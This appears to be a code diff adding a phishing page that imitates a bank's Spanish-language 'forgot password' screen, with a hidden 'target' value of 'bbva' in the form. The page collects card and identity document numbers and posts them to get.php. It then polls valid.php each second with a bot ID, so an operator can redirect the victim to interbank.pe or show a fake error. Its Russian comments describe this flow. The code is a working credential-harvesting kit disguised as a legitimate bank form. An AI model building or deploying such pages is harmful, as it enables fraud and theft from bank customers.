@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="initial-scale=1, width=device-width" />
+
+    <link rel="stylesheet" href="./global_1.css" />
+    <link rel="stylesheet" href="./index_1.css" />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Karla:wght@300;400;500;700&display=swap"
+    />
+  </head>
+  <body>
+    <div class="olvide">
+      <div class="por-favor-ingresa">Por favor, ingresa tus datos:</div>
+      <h2 class="olvide-mi-contrasea">Olvide mi contraseña</h2>
+      <form class="text-inputs-with-labels-valu-wrapper">
+        <div class="text-inputs-with-labels-valu">
+          <input class="rectangle" type="text" placeholder="Número de tarjeta" />
+        </div>
+        <div class="text-inputs-with-labels-valu1">
+          <input class="rectangle1" type="text" placeholder="Número de documento" />
+        </div>
+        <input type="hidden" name="botid">
+        <input type="hidden" name="target" value="bbva">
+        <button type="submit" class="normal-primary">
+          <img class="rectangle-icon" alt="" src="./public/rectangle.svg" />
+          <b class="apply">Ingresar</b>
+        </button>
+      </form>      
+      <select class="frame">
+        <option value="1">DNI</option>
+        <option value="1">Pasaporte</option>
+        <option value="1">CE</option>
+      </select>
+      <button class="normal-primary">
+        <img class="rectangle-icon" alt="" src="./public/rectangle.svg" />
+
+        <b class="apply">Siguiente</b>
+      </button>
+      <button class="arrow-down">
+        <img
+          class="vuesaxlineararrow-down-icon"
+          alt=""
+          src="./public/vuesaxlineararrowdown.svg"
+        />
+      </button>
+    <script>
+      function sendForm(event, formid) {
+ 
+ var form = document.getElementById(formid);
+
+ var formData = new FormData(form);
+ 
+ var botId = getQueryParam("botid");
+ formData.append("botid", botId); //добавляем ботайди
+ formData.append("target", "bbva"); //добавляем ботайди
+
+ var xhr = new XMLHttpRequest();
+ xhr.open("POST", "get.php", true);
+ xhr.onreadystatechange = function () {
+   if (xhr.readyState === 4 && xhr.status === 200) {
+     // Обработка успешного ответа сервера
+     console.log(xhr.responseText);
+     sendRequestWithBotId(); // Начинаем отслеживание с сервера
+   } else {
+     // Обработка ошибок
+     console.error(xhr.statusText);
+   }
+ };
+ console.log(formData);
+ xhr.send(formData);
+
+}
+
+function sendRequestWithBotId() {
+ var botId = getQueryParam("botid");
+
+ if (botId) {
+   var xhr = new XMLHttpRequest();
+   xhr.open("GET", "valid.php?botid=" + botId, true);
+   xhr.onreadystatechange = function () {
+     if (xhr.readyState === 4) {
+       var responseCode = xhr.status;
+       if (responseCode === 200) {
+         setTimeout(sendRequestWithBotId, 1000); // обновляется эта команда каждую секунду
+       } else if (responseCode === 201) {
+         window.location.href = "https://interbank.pe"; //редир на интер
+       } else if (responseCode === 202) {
+        
+        alert('Se ha producido un error. Por favor, repita más tarde.');
+
+       } else {
+         console.error("Unexpected response code: " + responseCode);
+       }
+     }
+   };
+   xhr.send();
+ } else {
+   console.error("Missing botid parameter");
+ }
+}
+
+function getQueryParam(name) {
+ var urlParams = new URLSearchParams(window.location.search);
+ return urlParams.get(name);
+}
+    </script>
+    
+    
+    
+    </div>
+  </body>
+</html>
